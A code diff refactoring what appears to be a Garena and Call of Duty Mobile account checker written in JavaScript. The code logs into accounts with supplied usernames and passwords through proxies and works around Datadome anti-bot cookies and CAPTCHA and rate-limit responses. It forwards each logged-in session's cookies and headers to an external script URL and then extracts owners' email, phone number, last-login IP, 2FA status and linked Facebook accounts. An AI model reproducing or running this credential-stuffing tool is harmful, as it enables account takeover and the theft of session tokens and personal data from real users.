-            "User-Agent": selectedHeader['User-Agent']
+            "User-Agent": headers['User-Agent'] // Match UA
+        };
+        const scriptConfig = {
+            headers: scriptHeaders,
+            timeout: 45000,
+            proxy: proxies ? proxies : false,
+             // Use the same cookie jar if the external script relies on session cookies set earlier
+            // jar: axiosInstance.defaults.jar // Already part of axiosInstance
         };
 
         try {
-            logger.debug(`Calling external CODM script: ${EXTERNAL_SCRIPT_URL} with token ${extractedToken.substring(0, 10)}...`);
-            const responseCodm = await axios.post(EXTERNAL_SCRIPT_URL, payloadForScript, {
-                headers: scriptHeaders,
-                timeout: 45000, // 45 seconds
-                // proxy: proxies ? { host: proxyHost, port: proxyPort } : false,
-                // Transform response to ensure it's a string for consistent handling
-                 transformResponse: [(data) => {
-                     // If it's already a string, keep it. If object/buffer, stringify.
-                     if (typeof data === 'string') return data;
-                     try { return JSON.stringify(data); } catch { return String(data); }
-                 }],
-                 validateStatus: status => status >= 200 && status < 500 // Allow 4xx
-            });
-
-            const responseCodmTextClean = stripAnsi(responseCodm.data.trim()); // data should be string due to transformResponse
-            logger.debug(`External CODM script response (cleaned): ${responseCodmTextClean.substring(0, 200)}`);
+            log.debug(`Calling external CODM script: ${EXTERNAL_SCRIPT_URL} with token ${extractedToken.slice(0, 10)}...`, 'showLevel');
+            const responseCodm = await axiosInstance.post(EXTERNAL_SCRIPT_URL, payloadForScript, scriptConfig);
+            // Assuming script returns plain text, trim whitespace
+            const responseCodmTextClean = stripAnsiCodes((responseCodm.data || "").toString().trim());
+            log.debug(`External CODM script response (cleaned): ${responseCodmTextClean.slice(0, 200)}`, 'showLevel');
 
             if (detectCaptchaInResponse(responseCodmTextClean)) {
-                logger.warn("CAPTCHA detected in external CODM script response.");
+                log.warn("CAPTCHA detected in external CODM script response.", 'showLevel');
                 return "[API_ERROR] CAPTCHA Detected (CODM External Script Response)";
             }
-             if (responseCodm.status >= 400) {
-                logger.warn(`External CODM script returned HTTP error ${responseCodm.status}: ${responseCodmTextClean.substring(0, 150)}`);
-                // Optionally check for captcha again in error response
-                 if (detectCaptchaInResponse(responseCodmTextClean)) {
-                    return "[API_ERROR] CAPTCHA Detected (CODM External Script HTTP Error)";
-                }
-                return `[CODM_FAIL] Script HTTP error ${responseCodm.status}: ${responseCodmTextClean.substring(0, 100)}`;
-            }
 
-            // Check response format
-            if (responseCodmTextClean.includes("|") && responseCodmTextClean.split("|").length === 4) {
-                const parts = responseCodmTextClean.split("|");
-                // Check if level part is numeric and other parts are non-empty/not 'N/A'
-                const levelPart = parts[1] ? parts[1].trim() : "";
-                const isValidLevel = /^\d+$/.test(levelPart); // Check if it's digits only
-                const areOtherPartsValid = parts.every(p => p && p.trim() !== "N/A");
-
-                if (isValidLevel && areOtherPartsValid) {
-                    logger.info(`CODM script success: ${responseCodmTextClean}`);
-                    return responseCodmTextClean; // Return the successful string
+            // Check if response looks valid (original script format)
+            const parts = responseCodmTextClean.split("|");
+            if (parts.length === 4) {
+                // Basic validation: check if level looks like a number and parts are not empty/N/A
+                 const levelStr = parts[1];
+                 // Check if it contains only digits
+                if (/^\d+$/.test(levelStr) && parts.every(p => p && p.trim() !== "N/A")) {
+                    log.info(`CODM script success: ${responseCodmTextClean}`, 'showLevel');
+                    return responseCodmTextClean; // Return the raw string
                 } else {
-                    logger.warn(`CODM script returned parsable but invalid data: ${responseCodmTextClean}`);
-                    return `[CODM_WARN] Script data invalid: ${responseCodmTextClean.substring(0, 100)}`;
+                    log.warn(`CODM script returned parsable but invalid data: ${responseCodmTextClean}`, 'showLevel');
+                    return `[CODM_WARN] Script data invalid: ${responseCodmTextClean.slice(0, 100)}`;
                 }
             } else {
-                // Handle specific error messages from the script
-                 const lowerCaseResponse = responseCodmTextClean.toLowerCase();
-                if (lowerCaseResponse.includes("not found") || lowerCaseResponse.includes("invalid token")) {
-                    logger.warn(`CODM script indicated account not linked or invalid token: ${responseCodmTextClean}`);
+                // Handle common failure messages
+                const lowerResponse = responseCodmTextClean.toLowerCase();
+                if (lowerResponse.includes("not found") || lowerResponse.includes("invalid token")) {
+                    log.warn(`CODM script indicated account not linked or invalid token: ${responseCodmTextClean}`, 'showLevel');
                     return `[CODM_FAIL] Account likely not linked or token invalid.`;
-                } else if (lowerCaseResponse.includes("error") || lowerCaseResponse.includes("fail")) {
-                     logger.warn(`CODM script returned error: ${responseCodmTextClean}`);
-                     return `[CODM_FAIL] Script error: ${responseCodmTextClean.substring(0, 150)}`;
-                } else {
-                     logger.warn(`CODM script returned unexpected format: ${responseCodmTextClean}`);
-                     return `[CODM_WARN] Script unexpected format: ${responseCodmTextClean.substring(0, 100)}`;
+                } else if (lowerResponse.includes("error") || lowerResponse.includes("fail")) {
+                     log.warn(`CODM script returned error: ${responseCodmTextClean}`, 'showLevel');
+                     return `[CODM_FAIL] Script error: ${responseCodmTextClean.slice(0, 150)}`;
+                } else { // Unexpected format
+                     log.warn(`CODM script returned unexpected format: ${responseCodmTextClean}`, 'showLevel');
+                     return `[CODM_WARN] Script unexpected format: ${responseCodmTextClean.slice(0, 100)}`;
                 }
             }
 
-        } catch (scriptError) {
-             const errorStr = stripAnsiCodes(scriptError.toString());
-             const respText = scriptError.response ? stripAnsiCodes(String(scriptError.response.data)) : ""; // data might not be json
-             const status = scriptError.response ? scriptError.response.status : "N/A";
-
-             if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
-                logger.warn(`CAPTCHA detected during external CODM script request error: ${errorStr}`);
+        } catch (error) {
+            const errorStr = stripAnsiCodes(error.toString());
+            const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
+            if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
+                log.warn(`CAPTCHA detected during external CODM script request error: ${errorStr}`, 'showLevel');
                 return "[API_ERROR] CAPTCHA Detected (CODM External Script Request Error)";
             }
-             if (scriptError.code === 'ECONNABORTED' || scriptError.message.includes('timeout')) {
-                 logger.error("CODM check script request timed out.");
+            if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
+                log.error("CODM check script request timed out.", 'showLevel');
                 return "[API_ERROR][Timeout] CODM check script request timed out.";
-             }
-            logger.error(`Error contacting CODM check script: ${errorStr} (Status: ${status}) Response: ${respText.substring(0,100)}`);
-            return `[CODM_FAIL] Error contacting check script: ${errorStr.substring(0, 100)}`;
+            }
+            log.error(`Error contacting CODM check script: ${error}`, 'showLevel');
+            return `[CODM_FAIL] Error contacting check script: ${errorStr.slice(0, 100)}`;
         }
 
-    } catch (callbackError) {
-        // Handle errors from the callback/redirect loop
-        const errorStr = stripAnsiCodes(callbackError.toString());
-        const respText = callbackError.response ? stripAnsiCodes(String(callbackError.response.data)) : ""; // Data might be HTML
-        const status = callbackError.response ? callbackError.response.status : "N/A";
-         const errorDetail = `${errorStr.substring(0, 100)}` + (status !== 'N/A' ? ` (Status: ${status})` : "");
-
-        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
-            logger.warn(`CAPTCHA detected during CODM callback request error: ${errorStr}`);
-            return "[API_ERROR] CAPTCHA Detected (CODM Callback Request Error)";
+    } catch (error) { // Catch errors from the redirect loop itself if any slip through
+        const errorStr = stripAnsiCodes(error.toString());
+        if (detectCaptchaInResponse(errorStr)) {
+            log.warn("CAPTCHA detected during unexpected error in CODM callback phase.", 'showLevel');
+            return "[API_ERROR] CAPTCHA Detected (CODM Callback Unexpected Error)";
         }
-         if (callbackError.code === 'ECONNABORTED' || callbackError.message.includes('timeout')) {
-             logger.error("CODM callback request timed out.");
-            return "[API_ERROR][Timeout] CODM callback request timed out.";
-        }
-         logger.warn(`CODM Callback Request Error: ${errorStr} Response: ${respText.substring(0,100)}`);
-         return `[CODM_FAIL] Callback request error: ${errorDetail}`;
+        log.error(`Unexpected error during CODM callback/redirect handling: ${error}`, 'showLevel');
+        return `[CODM_FAIL] Unexpected error during callback: ${errorStr.slice(0, 100)}`;
     }
 }
 
 
-async function checkLogin(accountUsername, _id, encryptedPassword, password, selectedHeader, initialCookies, datadomeFromPrelogin, date, proxies = null) {
-    let currentCookies = { ...initialCookies }; // Copy initial cookies
-    logger.debug(`Starting check_login for ${accountUsername}`);
+async function checkLogin(accountUsername, _id, encryptedPassword, password, baseHeaders, axiosInstance, date, proxies = null) {
+    log.debug(`Starting check_login for ${accountUsername}`, 'checkLogin');
 
-    if (datadomeFromPrelogin) {
-        logger.debug("Using Datadome cookie from prelogin.");
-        currentCookies["datadome"] = datadomeFromPrelogin;
-    } else {
-        logger.debug("No Datadome from prelogin, attempting manual fetch.");
-        const manualDatadomeResult = await getDatadomeCookie(proxies);
-        if (typeof manualDatadomeResult === 'string' && manualDatadomeResult.startsWith("[")) { // Error string format
-            logger.warn(`Manual Datadome fetch failed for ${accountUsername}: ${manualDatadomeResult}`);
-            return manualDatadomeResult; // Return the error string
-        } else if (manualDatadomeResult) { // Successfully fetched string
-            logger.debug("Successfully fetched Datadome manually.");
-            currentCookies["datadome"] = manualDatadomeResult;
-        } else {
-            // Could be null or empty if fetch didn't error but didn't find cookie
-            logger.warn(`Manual Datadome fetch returned no cookie for ${accountUsername}. Proceeding without.`);
+    // Datadome cookie should be handled by the axiosInstance's cookie jar if set previously
+    // However, the original script fetched it manually if not present. Let's try that if needed.
+    // We might need to extract the cookie from the jar to check if it exists.
+    const jar = axiosInstance.defaults.jar;
+    let datadomeValue = null;
+    if (jar) {
+        const cookies = await jar.getCookies('https://auth.garena.com/'); // Check cookies for the domain
+        const ddCookie = cookies.find(c => c.key === 'datadome');
+        if (ddCookie) {
+            datadomeValue = ddCookie.value;
+            log.debug("Datadome cookie found in jar.", 'checkLogin');
         }
     }
 
-    const loginParams = {
-        'app_id': '100082',
-        'account': accountUsername,
-        'password': encryptedPassword,
-        'redirect_uri': REDIRECT_URL,
-        'format': 'json',
-        'id': _id,
+    if (!datadomeValue) {
+        log.debug("No Datadome in jar or jar not present, attempting manual fetch.", 'checkLogin');
+        const manualDatadomeResult = await getDatadomeCookie(axiosInstance, proxies); // Use same instance
+        if (typeof manualDatadomeResult === 'string' && manualDatadomeResult.startsWith("[")) { // Error string
+            log.warn(`Manual Datadome fetch failed for ${accountUsername}: ${manualDatadomeResult}`, 'checkLogin');
+            // Decide if we should proceed or fail here. Let's try proceeding without it.
+            // return manualDatadomeResult; // Option: Fail immediately
+        } else if (typeof manualDatadomeResult === 'string' && manualDatadomeResult.length > 0) {
+            log.debug("Successfully fetched Datadome manually. Adding to jar.", 'checkLogin');
+            // Manually add the cookie to the jar for subsequent requests
+            await jar.setCookie(`datadome=${manualDatadomeResult}; Domain=.garena.com; Path=/`, 'https://auth.garena.com/');
+             datadomeValue = manualDatadomeResult; // Mark as found
+        } else {
+            log.warn(`Manual Datadome fetch returned None/empty for ${accountUsername}. Proceeding without.`, 'checkLogin');
+        }
+    }
+
+
+    // 1. Garena Login Request
+    const loginParams = new URLSearchParams({
+        app_id: '100082',
+        account: accountUsername,
+        password: encryptedPassword,
+        redirect_uri: REDIRECT_URL,
+        format: 'json',
+        id: _id,
+    });
+    const loginUrl = APK_URL + loginParams.toString();
+    log.debug(`Attempting Garena login: ${loginUrl}`, 'checkLogin');
+
+    const loginConfig = {
+        headers: baseHeaders,
+        timeout: 30000,
+        proxy: proxies ? proxies : false,
+        // Cookies handled by jar
     };
-    const loginUrl = `${APK_URL}${new URLSearchParams(loginParams).toString()}`;
-    logger.debug(`Attempting Garena login: ${loginUrl}`);
 
     let loginResponse;
     try {
-        loginResponse = await axios.get(loginUrl, {
-            headers: {
-                ...selectedHeader, // Use headers from getRequestData
-                'Cookie': formatCookiesForHeader(currentCookies) // Send current cookies
-            },
-            timeout: 30000, // 30 seconds
-            // proxy: proxies ? { host: proxyHost, port: proxyPort } : false,
-            validateStatus: status => status >= 200 && status < 500 // Handle 4xx/5xx manually
-        });
+        loginResponse = await axiosInstance.get(loginUrl, loginConfig);
+        const responseTextClean = stripAnsiCodes(JSON.stringify(loginResponse.data));
+        log.debug(`Login response status: ${loginResponse.status}, data snippet: ${responseTextClean.slice(0, 200)}`, 'checkLogin');
 
-        // Need to handle potential non-JSON responses carefully
-        let responseTextClean = '';
-        if (typeof loginResponse.data === 'string') {
-             responseTextClean = stripAnsiCodes(loginResponse.data);
-        } else if (typeof loginResponse.data === 'object' && loginResponse.data !== null) {
-            try {
-                 responseTextClean = stripAnsiCodes(JSON.stringify(loginResponse.data));
-            } catch {
-                responseTextClean = '[Could not stringify response object]';
-            }
-        } else {
-             responseTextClean = '[Unexpected response data type]';
-        }
-
-
-        logger.debug(`Login response status: ${loginResponse.status}, text snippet: ${responseTextClean.substring(0, 200)}`);
-
-        if (detectCaptchaInResponse(responseTextClean) || (loginResponse.status >= 400 && detectCaptchaInResponse(responseTextClean))) {
-            logger.warn(`CAPTCHA detected in login response for ${accountUsername}.`);
+        if (detectCaptchaInResponse(responseTextClean)) {
+            log.warn(`CAPTCHA detected in login response for ${accountUsername}.`, 'checkLogin');
             return "[API_ERROR] CAPTCHA Detected (Login Response)";
         }
-
-        // Handle HTTP errors after CAPTCHA check
-         if (loginResponse.status === 403) {
-            logger.warn(`Login forbidden (403) for ${accountUsername}: ${responseTextClean.substring(0, 100)}`);
-            return "[LOGIN_FAIL] Login Forbidden (403)";
-         }
-         if (loginResponse.status === 429) {
-             logger.warn(`Login rate limited (429) for ${accountUsername}`);
-             return "[API_ERROR][RateLimit] Rate Limited (429)";
-         }
-         if (loginResponse.status >= 400) { // Other 4xx/5xx errors
-             logger.warn(`Login HTTP Error ${loginResponse.status} for ${accountUsername}: ${responseTextClean.substring(0, 200)}`);
-             return `[API_ERROR][HTTP] Login HTTP Error ${loginResponse.status}`;
-         }
+        // Axios throws for >= 400 by default, so no need for explicit raise_for_status if not caught
 
     } catch (error) {
         const errorStr = stripAnsiCodes(error.toString());
-        const status = error.response ? error.response.status : "N/A";
+        const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
 
-         if (detectCaptchaInResponse(errorStr) || (error.response && detectCaptchaInResponse(String(error.response.data)))) {
-            logger.warn(`CAPTCHA potentially detected during login request error for ${accountUsername}: ${errorStr}`);
+        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
+            log.warn(`CAPTCHA detected during login request error for ${accountUsername}: ${errorStr}`, 'checkLogin');
             return "[API_ERROR] CAPTCHA Detected (Login Request Error)";
         }
-         if (error.code === 'ECONNREFUSED') {
-            logger.error(`Login connection error for ${accountUsername}: ${errorStr}`);
-            return "[API_ERROR][Connection] Server refused connection";
-         }
-         if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
-            logger.error(`Login timed out for ${accountUsername}`);
+        if (error.code === 'ECONNREFUSED') {
+             log.error(`Login connection error for ${accountUsername}: ${error}`, 'checkLogin');
+             return "[API_ERROR][Connection] Server refused connection";
+        }
+        if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
+            log.error(`Login timed out for ${accountUsername}`, 'checkLogin');
             return "[API_ERROR][Timeout] Login Timeout";
-         }
-        // Handle other request errors (DNS, network, etc.)
-        logger.error(`Login request failed for ${accountUsername}: ${errorStr} (Status: ${status})`);
-        return `[API_ERROR][Request] Login Request Failed: ${errorStr.substring(0, 100)}`;
+        }
+        if (error.response) {
+            const status = error.response.status;
+            const respData = error.response.data;
+            log.warn(`Login HTTP Error ${status} for ${accountUsername}: ${JSON.stringify(respData).slice(0,200)}`, 'checkLogin');
+            if (status === 403) return "[LOGIN_FAIL] Login Forbidden (403)";
+            if (status === 429) return "[API_ERROR][RateLimit] Rate Limited (429)";
+            // Check error message in body for specific Garena errors
+            if (respData && typeof respData === 'object' && respData.error) {
+                 const garenaError = respData.error;
+                 if (garenaError.includes("error_password")) return "[LOGIN_FAIL] Incorrect password";
+                 if (garenaError.includes("error_account_does_not_exist")) return "[LOGIN_FAIL] Account doesn't exist";
+                 if (garenaError.includes("error_account_not_activated")) return "[LOGIN_FAIL] Account not activated";
+                 // Add more specific Garena login errors if known
+                 return `[LOGIN_FAIL] Login Error: ${garenaError}`;
+            }
+            return `[API_ERROR][HTTP] Login HTTP Error ${status}`;
+        }
+        log.error(`Login request failed for ${accountUsername}: ${error}`, 'checkLogin');
+        return `[API_ERROR][Request] Login Request Failed: ${errorStr.slice(0, 100)}`;
     }
 
-    // --- Process Successful Login Response ---
-    let loginJson;
-    try {
-        // Axios might have already parsed it if Content-Type was correct
-        loginJson = (typeof loginResponse.data === 'object' && loginResponse.data !== null)
-                    ? loginResponse.data
-                    : JSON.parse(loginResponse.data); // Attempt parse if it was a string
-         logger.debug(`Login JSON response for ${accountUsername}: ${JSON.stringify(loginJson).substring(0, 300)}`);
-    } catch (e) {
-        const responseTextClean = stripAnsiCodes(String(loginResponse.data));
-        logger.error(`Invalid Login JSON for ${accountUsername}: ${responseTextClean.substring(0, 200)}`);
-        return `[API_ERROR] Invalid Login JSON Response`;
+    // 2. Parse Login Response Data
+    const loginJson = loginResponse.data;
+    if (!loginJson || typeof loginJson !== 'object') {
+         log.error(`Invalid Login JSON (not an object) for ${accountUsername}: ${JSON.stringify(loginJson).slice(0,200)}`, 'checkLogin');
+         return `[API_ERROR] Invalid Login JSON Response`;
     }
-
-    // Update cookies from the successful login response
-    const loginCookies = parseCookies(loginResponse.headers['set-cookie']);
-    currentCookies = { ...currentCookies, ...loginCookies }; // Merge new cookies
-
-
+     // Check for error field again, even if status was 2xx
     if (loginJson.error) {
         const errorMsg = loginJson.error;
-        logger.warn(`Login error field for ${accountUsername}: ${errorMsg}`);
-        if (detectCaptchaInResponse(errorMsg)) {
-            return "[API_ERROR] CAPTCHA Required (Login Error Field)";
-        }
+        log.warn(`Login error field for ${accountUsername}: ${errorMsg}`, 'checkLogin');
+        if (detectCaptchaInResponse(errorMsg)) return "[API_ERROR] CAPTCHA Required (Login Error Field)";
         if (errorMsg.includes("error_password")) return "[LOGIN_FAIL] Incorrect password";
         if (errorMsg.includes("error_account_does_not_exist")) return "[LOGIN_FAIL] Account doesn't exist";
         if (errorMsg.includes("error_account_not_activated")) return "[LOGIN_FAIL] Account not activated";
-        // Add more specific error mappings if known
         return `[LOGIN_FAIL] Login Error: ${errorMsg}`;
     }
 
     if (!loginJson.session_key) {
-        logger.error(`Login response missing session_key for ${accountUsername}: ${JSON.stringify(loginJson)}`);
+        log.error(`Login response missing session_key for ${accountUsername}: ${JSON.stringify(loginJson)}`, 'checkLogin');
         return "[API_ERROR] Login Failed: No session key received";
     }
 
     const sessionKey = loginJson.session_key;
-    logger.info(`Garena Login successful for ${accountUsername}. Session Key obtained.`);
+    // Cookies from login are automatically added to the jar by axiosInstance
+    log.info(`Garena Login successful for ${accountUsername}. Session Key obtained.`, 'checkLogin');
 
-
-    // --- Fetch Account Info via External Script ---
-    const accInfoHeaders = { // Mimic Python's 'hider' dict more closely
-        'Host': 'account.garena.com',
+    // 3. Get Account Info (using external script)
+    const accInfoHeaders = {
+        'Host': 'account.garena.com', // Host for the target site, not the script URL
         'Connection': 'keep-alive',
-        'User-Agent': selectedHeader['User-Agent'] || "Mozilla/5.0",
-        'Accept': 'application/json, text/plain, */*', // As per Python code
-        'Referer': `https://account.garena.com/?session_key=${sessionKey}`,
+        'User-Agent': baseHeaders['User-Agent'],
+        'Accept': 'application/json, text/plain, */*',
+        'Referer': `https://account.garena.com/?session_key=${sessionKey}`, // Crucial referer
         'Accept-Language': 'en-US,en;q=0.9',
+        'sec-ch-ua': baseHeaders['sec-ch-ua'],
+        'sec-ch-ua-mobile': baseHeaders['sec-ch-ua-mobile'],
+        'sec-ch-ua-platform': baseHeaders['sec-ch-ua-platform'],
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
     };
-    // Add sec-ch-ua headers if present in selectedHeader
-    Object.keys(selectedHeader).forEach(key => {
-        if (key.toLowerCase().startsWith('sec-ch-ua')) {
-            accInfoHeaders[key] = selectedHeader[key];
-        }
-    });
 
-    // Prepare params including cookies and headers for the script
+    // Prepare params for the external script (passing cookies and headers)
     const scriptParams = {};
-    for (const [key, value] of Object.entries(currentCookies)) {
-        if (value) scriptParams[`coke_${key}`] = value; // Send non-empty cookies
-    }
+    const currentCookies = await jar.getCookies('https://account.garena.com/');
+    currentCookies.forEach(cookie => {
+        scriptParams[`coke_${cookie.key}`] = cookie.value;
+    });
+    // Convert header keys to snake_case for the script
     for (const [key, value] of Object.entries(accInfoHeaders)) {
-         const safeKey = key.replace(/-/g, '_').toLowerCase(); // Convert header names
-        if (value) scriptParams[`hider_${safeKey}`] = value; // Send non-empty headers
+        const safeKey = key.replace(/-/g, '_').toLowerCase();
+        scriptParams[`hider_${safeKey}`] = value;
     }
+
+    log.debug(`Fetching account info from external script: ${EXTERNAL_SCRIPT_URL}`, 'checkLogin');
+    const accInfoConfig = {
+        params: scriptParams, // Send cookies/headers as GET parameters
+        timeout: 60000,
+        proxy: proxies ? proxies : false,
+        // Use same cookie jar
+    };
 
     let initJsonResponse = null;
-    logger.debug(`Fetching account info from external script: ${EXTERNAL_SCRIPT_URL}`);
     try {
-        const initResponse = await axios.get(EXTERNAL_SCRIPT_URL, {
-            params: scriptParams, // Send data as query parameters
-            timeout: 60000, // 60 seconds
-            // proxy: proxies ? { host: proxyHost, port: proxyPort } : false,
-             transformResponse: [(data) => { // Ensure we get a string back
-                 if (typeof data === 'string') return data;
-                 try { return JSON.stringify(data); } catch { return String(data); }
-             }],
-            validateStatus: status => status >= 200 && status < 500 // Allow 4xx
-        });
-
-        const initTextClean = stripAnsiCodes(initResponse.data); // Should be a string
-        logger.debug(`Acc Info script response status: ${initResponse.status}, text snippet: ${initTextClean.substring(0, 200)}`);
+        // The original script used GET with params for this, mimic that
+        const initResponse = await axiosInstance.get(EXTERNAL_SCRIPT_URL, accInfoConfig);
+        const initTextClean = stripAnsiCodes(JSON.stringify(initResponse.data));
+        log.debug(`Acc Info script response status: ${initResponse.status}, data snippet: ${initTextClean.slice(0, 200)}`, 'checkLogin');
 
         if (detectCaptchaInResponse(initTextClean)) {
-            logger.warn(`CAPTCHA detected in acc info script response for ${accountUsername}.`);
+            log.warn(`CAPTCHA detected in acc info script response for ${accountUsername}.`, 'checkLogin');
             return "[API_ERROR] CAPTCHA Detected (Acc Info Script Response)";
         }
-         if (initResponse.status >= 400) {
-            logger.warn(`Acc Info script returned HTTP error ${initResponse.status} for ${accountUsername}: ${initTextClean.substring(0, 150)}`);
-            if (detectCaptchaInResponse(initTextClean)) {
-                return "[API_ERROR] CAPTCHA Detected (Acc Info Script HTTP Error)";
-            }
-            return `[API_ERROR] Acc Info script HTTP error ${initResponse.status}`;
-        }
 
-        // Attempt to parse the response as JSON
-        try {
-            initJsonResponse = JSON.parse(initTextClean);
-        } catch (jsonError) {
-            // Fallback: Try regex to find JSON within the text (less reliable)
-             const jsonMatch = initTextClean.match(/({.*?})/s); // Use 's' flag for dotall
-             if (jsonMatch && jsonMatch[1]) {
+        // Assume script returns JSON directly now
+        if (initResponse.data && typeof initResponse.data === 'object') {
+            initJsonResponse = initResponse.data;
+        } else {
+             // Try to parse if it's a string containing JSON
+             if (typeof initResponse.data === 'string') {
                  try {
-                     initJsonResponse = JSON.parse(jsonMatch[1]);
-                     logger.debug("Parsed JSON found within Acc Info script text response.");
-                 } catch (nestedJsonError) {
-                     logger.error(`Failed parsing JSON found within acc info script response for ${accountUsername}: ${jsonMatch[1].substring(0, 200)}`);
-                     return `[API_ERROR] Failed to parse account info response (Invalid JSON within text)`;
+                     initJsonResponse = JSON.parse(initResponse.data);
+                 } catch (parseError) {
+                      // Fallback: Regex search like original python? Less reliable.
+                      const jsonMatch = initResponse.data.match(/({.*?})/s); // 's' flag for dotall
+                      if (jsonMatch) {
+                          try {
+                              initJsonResponse = JSON.parse(jsonMatch[1]);
+                              log.debug("Parsed JSON found within acc info script text response.", 'checkLogin');
+                          } catch (nestedParseError) {
+                               log.error(`Failed parsing JSON found within acc info script response for ${accountUsername}: ${jsonMatch[1].slice(0, 200)}`, 'checkLogin');
+                               return `[API_ERROR] Failed to parse account info response (Invalid JSON within text)`;
+                          }
+                      } else {
+                         log.error(`Failed parsing acc info (Not JSON or no JSON found) for ${accountUsername}: ${initResponse.data.slice(0, 200)}`, 'checkLogin');
+                         return `[API_ERROR] Failed to parse account info response (Not valid JSON)`;
+                      }
                  }
              } else {
-                 logger.error(`Failed parsing acc info (Not JSON or no JSON found) for ${accountUsername}: ${initTextClean.substring(0, 200)}`);
-                 return `[API_ERROR] Failed to parse account info response (Not valid JSON)`;
+                 log.error(`Acc info script response was not an object or string: ${typeof initResponse.data}`, 'checkLogin');
+                 return "[API_ERROR] Failed to process account info response (Invalid structure)";
              }
         }
 
-         logger.debug(`Acc Info JSON response for ${accountUsername}: ${JSON.stringify(initJsonResponse).substring(0, 300)}`);
+        log.debug(`Acc Info JSON response for ${accountUsername}: ${JSON.stringify(initJsonResponse)}`, 'checkLogin');
 
     } catch (error) {
         const errorStr = stripAnsiCodes(error.toString());
-         const respText = error.response ? stripAnsiCodes(String(error.response.data)) : "";
-         const status = error.response ? error.response.status : "N/A";
-
-         if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
-            logger.warn(`CAPTCHA detected during acc info script request error for ${accountUsername}: ${errorStr}`);
+        const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
+        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
+            log.warn(`CAPTCHA detected during acc info script request error for ${accountUsername}: ${errorStr}`, 'checkLogin');
             return "[API_ERROR] CAPTCHA Detected (Acc Info Script Request Error)";
         }
-        if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
-            logger.error(`Account info script timed out for ${accountUsername}`);
+        if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
+            log.error(`Account info script timed out for ${accountUsername}`, 'checkLogin');
             return "[API_ERROR][Timeout] Account info script timeout";
         }
-        logger.error(`Account info script request failed for ${accountUsername}: ${errorStr} (Status: ${status}) Response: ${respText.substring(0,100)}`);
-        return `[API_ERROR][Request] Account info script request failed: ${errorStr.substring(0, 100)}`;
+        log.error(`Account info script request failed for ${accountUsername}: ${error}`, 'checkLogin');
+        return `[API_ERROR][Request] Account info script request failed: ${errorStr.slice(0, 100)}`;
     }
 
-
-    // --- Process Account Info ---
-    if (typeof initJsonResponse !== 'object' || initJsonResponse === null) {
-        logger.error(`Account info processing failed - response was not a valid object for ${accountUsername}`);
+    // --- Parse details from the script's JSON response ---
+     if (!initJsonResponse || typeof initJsonResponse !== 'object') {
+        log.error(`Account info processing failed - response was not a dictionary for ${accountUsername}`, 'checkLogin');
         return "[API_ERROR] Failed to process account info response (Invalid structure)";
     }
-
-    // Check for 'error' or lack of 'success' in the script's JSON response
-    if (initJsonResponse.error || initJsonResponse.success === false) {
-        const errorDetail = initJsonResponse.error || initJsonResponse.message || 'Unknown Error';
+    // Check for errors within the JSON response
+    // Adjust property names based on actual script output ('success', 'error', 'message')
+    if (initJsonResponse.error || initJsonResponse.success === false || initJsonResponse.status === 'error') {
+        const errorDetail = initJsonResponse.error || initJsonResponse.message || 'Unknown Error from script';
         const cleanErrorDetail = stripAnsiCodes(String(errorDetail));
-        logger.warn(`Account info script returned error for ${accountUsername}: ${cleanErrorDetail}`);
+        log.warn(`Account info script returned error for ${accountUsername}: ${cleanErrorDetail}`, 'checkLogin');
         if (detectCaptchaInResponse(cleanErrorDetail)) {
             return "[API_ERROR] CAPTCHA Required (Acc Info Script Error Field)";
         }
-        return `[API_ERROR] Account info script error: ${cleanErrorDetail.substring(0, 150)}`;
+        return `[API_ERROR] Account info script error: ${cleanErrorDetail.slice(0, 150)}`;
     }
 
-    // Extract data (similar parsing logic as Python)
-    const bindings = initJsonResponse.bindings || [];
-    const accountStatus = stripAnsiCodes(String(initJsonResponse.status || 'Unknown'));
+    // --- Extract data (Adjust keys based on *actual* script output) ---
+    const bindings = initJsonResponse.bindings || []; // Assuming 'bindings' is like ["key: value", ...]
+    const accountStatus = stripAnsiCodes(String(initJsonResponse.status || 'Unknown')); // 'status' might be top-level
+
     let country = "N/A", lastLogin = "N/A", lastLoginWhere = "N/A", avatarUrl = "N/A";
     let fbName = "N/A", fbLink = "N/A", mobile = "N/A", email = "N/A";
     let facebookBound = "False", emailVerified = "False", authenticatorEnabled = "False", twoStepEnabled = "False";
@@ -797,247 +792,195 @@ async function checkLogin(accountUsername, _id, encryptedPassword, password, sel
             const bindingClean = stripAnsiCodes(String(binding));
             if (bindingClean.includes(":")) {
                 try {
-                    const parts = bindingClean.split(":", 2); // Split only on the first colon
-                    const key = parts[0].trim().toLowerCase();
-                    const value = parts[1].trim();
-                    if (!value) return; // Skip if value is empty
+                    let [key, ...valueParts] = bindingClean.split(":");
+                    let value = valueParts.join(":").trim(); // Handle values containing colons
+                    key = key.trim().toLowerCase();
+                    if (!value) return;
 
-                    switch (key) {
-                        case "country": country = value; break;
-                        case "lastlogin": if (!key.includes("from") && !key.includes("ip")) lastLogin = value; break;
-                        case "lastloginfrom": lastLoginWhere = value; break;
-                        case "lastloginip": lastLoginIp = value; break;
-                        case "ckz": ckzCount = value; break;
-                        case "garena shells":
-                            const shellMatch = value.match(/(\d+)/);
-                            shell = shellMatch ? shellMatch[1] : "0";
-                            break;
-                        case "facebook account":
-                            if (value !== "N/A") { fbName = value; facebookBound = "True"; }
-                            break;
-                        case "fb link": fbLink = value; break;
-                        case "avatar": avatarUrl = value; break;
-                        case "mobile number": if (value !== "N/A") mobile = value; break;
-                        case "tae": emailVerified = value.toLowerCase().includes("yes") ? "True" : "False"; break;
